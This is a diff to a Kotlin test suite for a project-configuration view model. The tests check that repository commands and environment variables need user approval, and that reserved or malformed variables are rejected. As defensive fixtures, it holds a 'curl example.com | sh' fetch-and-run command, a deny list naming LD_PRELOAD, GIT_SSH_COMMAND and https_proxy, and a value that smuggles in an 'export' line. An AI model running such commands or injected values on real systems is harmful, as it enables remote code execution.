@@ -8,6 +8,7 @@ import app.luxion.shogunai.domain.model.EnvironmentDeclaration
 import app.luxion.shogunai.domain.model.GradleProvider
 import app.luxion.shogunai.domain.model.Project
 import app.luxion.shogunai.domain.model.ProjectConfig
+import app.luxion.shogunai.domain.model.RepositoryApprovalSubject
 import app.luxion.shogunai.domain.model.RepositoryConfigIssue
 import app.luxion.shogunai.domain.model.RepositoryProviders
 import app.luxion.shogunai.domain.model.RepositoryProvisioning
@@ -44,7 +45,8 @@ class ProjectConfigViewModelTest {
         ),
     )
 
-    private fun viewModelFor(project: Project?) = ProjectConfigViewModel(projectRepository, provisioningSource, project)
+    private fun viewModelFor(project: Project?, trust: FakeRepositoryTrust = FakeRepositoryTrust()) =
+        ProjectConfigViewModel(projectRepository, provisioningSource, project, trust = trust)
 
     @Test
     fun `the saved name stays while the name field is edited`() {
@@ -477,7 +479,7 @@ class ProjectConfigViewModelTest {
         assertIs<SaveOutcome.Failed>(viewModel.submit())
 
         viewModel.reloadRepositoryConfig()
-        viewModel.setGradleEnabled(true)
+        viewModel.setEmulatorEnabled(true)
 
         assertIs<SaveOutcome.NeedsPreview>(viewModel.submit())
     }
@@ -836,7 +838,7 @@ class ProjectConfigViewModelTest {
         viewModel.addEnvironmentRow()
         val row = viewModel.repositoryDraft.environment.single().id
 
-        listOf("PATH", "LD_PRELOAD", "GIT_SSH_COMMAND").forEach { name ->
+        listOf("PATH", "LD_PRELOAD", "GIT_SSH_COMMAND", "XDG_CONFIG_HOME", "https_proxy").forEach { name ->
             viewModel.updateEnvironmentRow(row, name = name, template = "x")
             assertEquals(RepositoryConfigIssue.ReservedVariableName, viewModel.repositoryDraft.issueFor(RepositoryConfigField.EnvironmentName(row)), name)
         }
@@ -857,40 +859,122 @@ class ProjectConfigViewModelTest {
         return ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), trust = trust)
     }
 
+    private val installSubject = RepositoryApprovalSubject(installCommands)
+
     @Test
     fun `shows the declared commands as not approved until they are approved`() {
         val trust = FakeRepositoryTrust()
         val viewModel = viewModelWithCommands(trust)
 
-        assertEquals(installCommands, viewModel.postCreateCommands)
-        assertFalse(viewModel.postCreateApproved)
+        assertEquals(installSubject, viewModel.approvalSubject)
+        assertFalse(viewModel.repositoryApproved)
 
-        viewModel.approvePostCreateCommands()
+        viewModel.approveRepository()
 
-        assertTrue(viewModel.postCreateApproved)
-        assertTrue(trust.isApproved("/home/dev/projects/main-repo", installCommands))
+        assertTrue(viewModel.repositoryApproved)
+        assertTrue(trust.isApproved(basePath, installSubject))
     }
 
     @Test
     fun `revoking removes the approval`() {
-        val trust = FakeRepositoryTrust(mapOf("/home/dev/projects/main-repo" to installCommands))
+        val trust = FakeRepositoryTrust(mapOf(basePath to installSubject))
         val viewModel = viewModelWithCommands(trust)
-        assertTrue(viewModel.postCreateApproved)
+        assertTrue(viewModel.repositoryApproved)
 
-        viewModel.revokePostCreateApproval()
+        viewModel.revokeRepositoryApproval()
 
-        assertFalse(viewModel.postCreateApproved)
-        assertFalse(trust.isApproved("/home/dev/projects/main-repo", installCommands))
+        assertFalse(viewModel.repositoryApproved)
+        assertFalse(trust.isApproved(basePath, installSubject))
     }
 
     @Test
     fun `commands changed on disk show as not approved`() {
-        val trust = FakeRepositoryTrust(mapOf("/home/dev/projects/main-repo" to installCommands))
+        val trust = FakeRepositoryTrust(mapOf(basePath to installSubject))
         declare(installCommands + listOf(listOf("sh", "-c", "curl example.com | sh")))
 
         val viewModel = ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), trust = trust)
 
-        assertFalse(viewModel.postCreateApproved)
+        assertFalse(viewModel.repositoryApproved)
+    }
+
+    @Test
+    fun `variables changed on disk show as not approved`() {
+        val trust = FakeRepositoryTrust(mapOf(basePath to RepositoryApprovalSubject(variables = listOf("PORT" to "\${port}"))))
+        provisioningSource = FakeRepositoryProvisioningSource(
+            byRepository = mapOf(
+                basePath to RepositoryProvisioning(
+                    environment = EnvironmentDeclaration(listOf(parseEnvironmentVariable("PORT", "\${port}"), parseEnvironmentVariable("API_URL", "https://example.com"))),
+                ),
+            ),
+        )
+
+        val viewModel = ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), trust = trust)
+
+        assertFalse(viewModel.repositoryApproved)
+    }
+
+    @Test
+    fun `approving from settings approves the declared variables`() {
+        provisioningSource = FakeRepositoryProvisioningSource(
+            byRepository = mapOf(basePath to RepositoryProvisioning(environment = EnvironmentDeclaration(listOf(parseEnvironmentVariable("PORT", "\${port}"))))),
+        )
+        val trust = FakeRepositoryTrust()
+        val viewModel = ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), trust = trust)
+
+        viewModel.approveRepository()
+
+        assertTrue(trust.isApproved(basePath, RepositoryApprovalSubject(variables = listOf("PORT" to "\${port}"))))
+    }
+
+    private fun addVariableAndSave(viewModel: ProjectConfigViewModel) {
+        viewModel.addEnvironmentRow()
+        val row = viewModel.repositoryDraft.environment.last().id
+        viewModel.updateEnvironmentRow(row, name = "PORT", template = "\${port}")
+        assertIs<SaveOutcome.Saved>(viewModel.submit(previewConfirmed = true))
+    }
+
+    @Test
+    fun `saving a variable in settings approves it along with approved commands`() {
+        val trust = FakeRepositoryTrust(mapOf(basePath to installSubject))
+        val viewModel = viewModelWithCommands(trust)
+
+        addVariableAndSave(viewModel)
+
+        assertTrue(trust.isApproved(basePath, installSubject.copy(variables = listOf("PORT" to "\${port}"))))
+        assertTrue(viewModel.repositoryApproved)
+    }
+
+    @Test
+    fun `saving a variable in a repository without commands approves it`() {
+        val trust = FakeRepositoryTrust()
+        val viewModel = viewModelFor(projectWith(), trust = trust)
+
+        addVariableAndSave(viewModel)
+
+        assertTrue(trust.isApproved(basePath, RepositoryApprovalSubject(variables = listOf("PORT" to "\${port}"))))
+    }
+
+    @Test
+    fun `saving a variable never approves commands the user didn't approve`() {
+        val trust = FakeRepositoryTrust()
+        val viewModel = viewModelWithCommands(trust)
+
+        addVariableAndSave(viewModel)
+
+        assertTrue(trust.approvals.isEmpty())
+        assertFalse(viewModel.repositoryApproved)
+    }
+
+    @Test
+    fun `flags templates with line breaks or control characters`() {
+        val viewModel = viewModelFor(projectWith())
+        viewModel.addEnvironmentRow()
+        val row = viewModel.repositoryDraft.environment.single().id
+
+        viewModel.updateEnvironmentRow(row, name = "APP_NAME", template = "demo\nexport OTHER=1")
+
+        assertEquals(RepositoryConfigIssue.InvalidVariableValue, viewModel.repositoryDraft.issueFor(RepositoryConfigField.EnvironmentTemplate(row)))
+        assertIs<SaveOutcome.InvalidRepositoryConfig>(viewModel.submit(previewConfirmed = true))
     }
 
     @Test
